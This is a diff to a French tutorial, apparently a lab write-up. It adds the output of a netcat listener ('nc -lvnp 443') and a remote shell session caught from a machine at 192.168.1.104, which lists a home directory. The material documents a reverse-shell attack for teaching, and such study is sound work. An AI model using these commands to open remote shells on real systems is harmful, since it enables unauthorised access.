@@ -40,6 +40,7 @@ Notre machine
 
 ```shell
 user@ip:/home/user $ sudo nc -lvnp 443
+Listening on 0.0.0.0 443
 ```
 Mise en place du listener.
 
@@ -53,7 +54,21 @@ Execution du script
 Notre machine
 
 ```shell
-
+Connection received on 192.168.1.104 47512
+ls
+Bookshelf
+Desktop
+Documents
+Downloads
+Music
+Pictures
+pi-rfid
+prog.py
+Public
+script.py
+script.py.save
+Templates
+Videos
 ```
 
 
